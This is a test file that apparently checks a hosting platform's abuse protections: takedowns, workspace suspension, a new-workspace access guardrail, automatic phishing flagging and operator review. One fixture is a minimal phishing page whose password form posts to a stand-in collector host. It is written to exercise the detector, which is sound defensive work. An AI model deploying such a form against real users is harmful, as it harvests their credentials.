// Abuse protection end to end in the Workers runtime: takedown, suspension, the new-workspace guardrail, the
// phishing check's flag, and the operator's API. Rate limits by address are in scripts/e2e.mjs, which sends one.
import { SELF } from 'cloudflare:test';
import { describe, expect, it } from 'vitest';
import { API, admin, confirmLink, setup, trust } from './helpers';

describe('abuse protection', () => {
  it('takes an app down and brings it back', async () => {
    const { workspace, tool, deploy } = await setup();
    const app = await deploy('Down');
    await tool('deploy_app', { app: app.app, environment: 'production', files: [{ path: 'index.html', content: 'v2' }] });
    expect((await admin(`apps/${workspace}/${app.app}/takedown`, {})).body.error.code).toBe('need_reason');
    expect((await admin(`apps/${workspace}/${app.app}/takedown`, { reason: 'phishing' })).status).toBe(200);
    const page = await SELF.fetch(app.url + '/', { redirect: 'manual' });
    expect(page.status).toBe(410);
    expect(await page.text()).toContain('This app has been taken down');
    expect((await SELF.fetch(app.url + '/_brod/me')).status).toBe(410);
    const status = (await tool('get_status', { app: app.app })).data;
    expect(status.taken_down).toMatchObject({ reason: 'phishing' });
    for (const [name, args] of [['set_paused', { paused: false }], ['rollback', { version: 1 }], ['set_access', { access: 'workspace' }]] as const)
      expect((await tool(name, { app: app.app, ...args })).data.error, name).toBe('taken_down');
    expect((await tool('deploy_app', { app: app.app, files: [{ path: 'index.html', content: 'x' }] })).data.error).toBe('taken_down');
    expect((await tool('set_access', { app: app.app, access: 'private' })).isError).toBe(false);   // narrowing still works
    expect((await tool('list_apps')).data.apps[0].taken_down.reason).toBe('phishing');
    const log = (await tool('get_logs', { app: app.app })).data.events;
    expect(log.some((e: any) => e.action === 'takedown' && e.by === 'Brod operator')).toBe(true);

    expect((await admin(`apps/${workspace}/${app.app}/restore`)).status).toBe(200);
    expect((await tool('get_status', { app: app.app })).data.taken_down).toBeUndefined();
    expect((await tool('deploy_app', { app: app.app, files: [{ path: 'index.html', content: 'back' }] })).isError).toBe(false);
  });

  it('suspends a workspace: its apps stop and it cannot deploy', async () => {
    const { workspace, tool, deploy } = await setup();
    const app = await deploy('Suspended');
    expect((await admin(`workspaces/${workspace}/suspend`, { reason: 'spam' })).status).toBe(200);
    expect((await SELF.fetch(app.url + '/', { redirect: 'manual' })).status).toBe(410);
    expect((await tool('deploy_app', { name: 'Another', files: [{ path: 'index.html', content: 'x' }] })).data.error).toBe('workspace_suspended');
    expect((await tool('get_status', { app: app.app })).data.workspace_suspended).toMatchObject({ reason: 'spam' });
    expect((await admin(`workspaces/${workspace}/unsuspend`)).status).toBe(200);
    expect((await tool('deploy_app', { name: 'Another', files: [{ path: 'index.html', content: 'x' }] })).isError).toBe(false);
  });

  it('keeps a new workspace\'s apps inside it until the operator trusts it', async () => {
    const { admin: person, workspace, tool, deploy } = await setup();
    const app = await deploy('Young');
    const refused = await tool('set_access', { app: app.app, access: 'public' });
    expect(refused.data).toMatchObject({ error: 'workspace_too_new' });
    expect(refused.data.message).toContain('"workspace"');
    expect((await person.api(`/v1/apps/${app.app}/access`, { json: { access: 'signed_in' } })).body.error.code).toBe('workspace_too_new');
    expect((await person.api(`/v1/apps/${app.app}/access`, { json: { password: 'a long enough password' } })).body.error.code).toBe('workspace_too_new');
    expect((await person.api(`/v1/apps/${app.app}/access`, { json: { access: 'workspace' } })).status).toBe(200);
    await trust(workspace);
    const req = await tool('set_access', { app: app.app, access: 'public' });
    expect((await confirmLink(person, req.data.confirm_url)).status).toBe(200);
    expect((await tool('get_status', { app: app.app })).data.access).toBe('public');
  });

  it('keeps a flagged version private, files a report, and lets the operator clear it', async () => {
    const { admin: person, workspace, tool } = await setup();
    await trust(workspace);
    const html = '<title>Example</title><form action="https://collector.example.net/x"><input type="password"></form><p>Verify your account</p>';
    const app = (await tool('deploy_app', { name: 'Flagged', files: [{ path: 'index.html', content: html }] })).data;
    expect(app.flagged.reasons).toContain('a password field');
    const queue = (await admin('reports?status=open', undefined, 'GET')).body.reports;
    const rep = queue.find((r: any) => r.app === app.app && r.kind === 'automatic');
    expect(rep?.reporter).toBe('brod');
    const wide = await person.api(`/v1/apps/${app.app}/access`, { json: { access: 'workspace' } });
    expect(wide.body.error.code).toBe('flagged');
    expect((await person.api(`/v1/apps/${app.app}/access`, { json: { access: 'people', add: [person.email] } })).status).toBe(200);

    expect((await admin(`apps/${workspace}/${app.app}/clear`)).body.cleared_versions).toBe(1);
    expect((await tool('get_status', { app: app.app })).data.flagged).toBeUndefined();
    expect((await person.api(`/v1/apps/${app.app}/access`, { json: { access: 'workspace' } })).status).toBe(200);
    // A flagged deploy to an app that is already open narrows it to named people.
    const again = (await tool('deploy_app', { app: app.app, environment: 'production', files: [{ path: 'index.html', content: html }] })).data;
    expect(again.access).toBe('people');
    // On staging a flagged version leaves the app's access alone (staging is for builders only); publishing it narrows.
    expect((await admin(`apps/${workspace}/${app.app}/clear`)).status).toBe(200);
    expect((await person.api(`/v1/apps/${app.app}/access`, { json: { access: 'workspace' } })).status).toBe(200);
    const staged = (await tool('deploy_app', { app: app.app, files: [{ path: 'index.html', content: html }] })).data;
    expect([staged.environment, staged.access]).toEqual(['staging', 'workspace']);
    expect((await tool('publish_staging', { app: app.app })).data).toMatchObject({ published: staged.version, access: 'people' });
    expect((await admin(`reports/${rep.id}`, { status: 'dismissed', note: 'a test' })).body).toMatchObject({ status: 'dismissed' });
  });

  it('refuses the admin API without the secret', async () => {
    expect((await SELF.fetch(`${API}/v1/admin/reports`)).status).toBe(401);
  });
});
